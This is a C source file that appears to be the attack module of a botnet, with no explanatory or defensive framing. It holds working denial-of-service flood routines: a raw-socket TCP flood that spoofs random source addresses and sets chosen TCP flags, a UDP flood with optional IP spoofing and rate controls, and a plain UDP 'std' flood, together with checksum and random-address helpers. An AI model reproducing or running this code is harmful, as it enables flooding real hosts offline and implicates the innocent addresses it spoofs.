#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#define PHI 0x9e3779b9

#include "includes.h"

static uint32_t x, y, z, w;
struct in_addr ourIP;
static uint32_t Q[4096], c = 362436;


void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}
uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;

    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

void makeRandomStr(unsigned char *buf, int length);
void makeRandomStr(unsigned char *buf, int length)
{
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}
uint32_t rand_next(void)
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y;
    y = z;
    z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}
in_addr_t getRandomIP(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while( count > 1 ) {
        sum += *buf++;
        count -= 2;
    }
    if(count > 0) {
        sum += *(unsigned char *)buf;
    }
    while (sum>>16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}

void tcp_attack(unsigned char *target, uint16_t port, int timeEnd, unsigned char *flags)
{
#ifdef DEBUG
		printf("[tcp-flood] attack sent for %d seconds \n", timeEnd);
#endif
	int spoofit = 32;
int packetsize = 0;
int pollinterval = 10;
int sleepcheck = 1000000;
int sleeptime = 0;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(target);
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) {
        return;
    }
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
        return;
    }
    in_addr_t netmask;
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    if(strstr(flags, "URG")) {
        tcph->urg = 1;
    }
    else if(strstr(flags, "ACK")) {
        tcph->ack = 1;
    }
    else if(strstr(flags, "RST")) {
        tcph->rst = 1;
    }
    else if(strstr(flags, "FIN")) {
        tcph->fin = 1;
    }
    else if(strstr(flags, "SYN")) {
        tcph->syn = 1;
    }
    else if(strstr(flags, "PSH")) {
        tcph->psh = 1;
    }
    else {
        tcph->urg = 1;
        tcph->ack = 1;
        tcph->fin = 1;
        tcph->psh = 1;
        tcph->rst = 1;
		tcph->syn = 1;
    }
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end;
    end = time(NULL) + timeEnd;
    while(end > time(NULL))
    {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
    }
#ifdef DEBUG
		printf("[tcp-flood] attack finished! \n");
#endif
}

void rand_alphastr(uint8_t *str, int len)
{
    char alpha_set[200];
    strcpy(alpha_set,"qwertyuiopasdfghjklzxcvbnm1234567890");
    while(len--)
        *str++ = alpha_set[rand_next() % strlen(alpha_set)];
}

in_addr_t findRandIP(in_addr_t netmask)
{
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}

void udp_attack(unsigned char *target, uint16_t port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
#ifdef DEBUG
	printf("[udp-flood] attack sent for %d seconds \n", timeEnd);
#endif
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd) {
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1) {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister) {
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck) {
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd) {
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
            return;
        }
        int counter = 50;
        while(counter--) {
            srand(time(NULL) ^ rand_cmwc());
            init_rand(rand());
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1) {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister) {
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck) {
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
#ifdef DEBUG
		printf("[udp-flood] attack finished \n");
#endif
}

void std_attack(unsigned char *target, uint16_t port, int duration, int psize)
{
#ifdef DEBUG
		printf("[std-flood] attack sent for %d seconds \n", duration);
#endif
    char *data = malloc(psize);
    struct sockaddr_in MainSock;
    int mysock = socket(AF_INET, SOCK_DGRAM, 0);
    MainSock.sin_family = AF_INET;
    MainSock.sin_addr.s_addr = inet_addr(target);
    MainSock.sin_port = htons(port);
    int end;
    end = time(NULL) + duration;
    while(end > time(NULL))
    {
        data[psize] = (char)((rand() % 70) + 30);
        connect(mysock, (struct sockaddr *)&MainSock, sizeof(MainSock));
        send(mysock, data, psize, 0);
    }
#ifdef DEBUG
		printf("[std-flood] attack finished! \n");
#endif
    free(data);
}
